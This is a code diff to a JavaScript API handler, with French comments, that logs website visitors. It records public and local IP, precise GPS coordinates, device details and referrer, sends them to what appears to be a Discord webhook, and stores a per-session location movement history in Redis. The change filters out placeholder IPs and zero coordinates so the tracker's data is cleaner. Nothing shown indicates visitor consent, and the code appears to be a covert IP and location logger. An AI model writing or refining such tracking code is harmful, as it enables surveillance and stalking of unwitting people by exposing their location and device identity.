@@ -40,8 +40,14 @@ export default async function handler(req, res) {
 
   const { sessionId, isUpdate, forceDiscord, localIp, preciseLocation, deviceStats, userAgent, language, screenResolution, referrer, page } = req.body;
 
+  // --- FILTRAGE DES INFOS BIDON ---
+  let validatedLocalIp = localIp;
+  if (localIp && (localIp === '192.0.0.2' || localIp.includes('.local') || localIp === '0.0.0.0')) {
+    validatedLocalIp = "Indéterminée (Masquée)";
+  }
+
   // Validation stricte de la localisation précise
-  const hasGps = preciseLocation && typeof preciseLocation.lat === 'number' && typeof preciseLocation.lon === 'number';
+  const hasGps = preciseLocation && typeof preciseLocation.lat === 'number' && typeof preciseLocation.lon === 'number' && preciseLocation.lat !== 0;
 
   let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
   
@@ -70,7 +76,7 @@ export default async function handler(req, res) {
     timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
     unixTime: Date.now(),
     publicIp,
-    localIp,
+    localIp: validatedLocalIp,
     location: displayLocation,
     isp: geo.isp || 'ISP inconnu',
     coords: hasGps ? `${preciseLocation.lat}, ${preciseLocation.lon}` : `${geo.lat || '?'}, ${geo.lon || '?'}`,
@@ -107,7 +113,7 @@ export default async function handler(req, res) {
     const fields = [
       { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
       { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
-      { name: "🏠 IP Locale (Appareil)", value: `\`${localIp}\``, inline: true },
+      { name: "🏠 IP Locale (Appareil)", value: `\`${validatedLocalIp}\``, inline: true },
       { name: "📍 Localisation Précise", value: locValue }
     ];
 
@@ -153,7 +159,7 @@ export default async function handler(req, res) {
       }
       
       // 1. Log général
-      const logLine = `[${logEntry.timestamp}] IP:${publicIp} | Local:${localIp} | Loc:${logEntry.location} | Session:${logEntry.sessionId}\n`;
+      const logLine = `[${logEntry.timestamp}] IP:${publicIp} | Local:${validatedLocalIp} | Loc:${logEntry.location} | Session:${logEntry.sessionId}\n`;
       await client.lPush('visitor_logs', logLine);
 
       // 2. Historique de mouvement pour cette session
@@ -166,7 +172,7 @@ export default async function handler(req, res) {
         time: logEntry.timestamp,
         unixTime: logEntry.unixTime,
         isPrecise: logEntry.isPrecise,
-        localIp: localIp,
+        localIp: validatedLocalIp,
         page: logEntry.page
       });
       await client.rPush(`session_movement:${logEntry.sessionId}`, movementData);
